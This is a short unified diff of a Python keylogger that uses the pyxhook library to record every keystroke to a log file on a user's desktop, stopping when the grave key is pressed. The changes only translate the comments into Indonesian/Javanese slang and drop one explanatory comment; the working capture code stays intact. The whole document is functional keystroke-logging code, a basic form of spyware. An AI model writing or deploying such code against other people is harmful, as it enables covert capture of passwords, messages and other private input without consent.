@@ -1,16 +1,17 @@
 import pyxhook
-#change this to your log file's path
+#Ganti Path dibawah dengan path klean bro
 log_file='/home/sultonexe/Desktop/file.log'
 
-#this function is called everytime a key is pressed.
+#fungsi iki diceluk setiap kali tombol keyboard dipencet
 def OnKeyPress(event):
   fob=open(log_file,'a')
   fob.write(event.Key)
   fob.write('\n')
 
-  if event.Ascii==96: #96 is the ascii value of the grave key (`)
+  if event.Ascii==96: 
     fob.close()
     new_hook.cancel()
+    
 #instantiate HookManager class
 new_hook=pyxhook.HookManager()
 #listen to all keystrokes
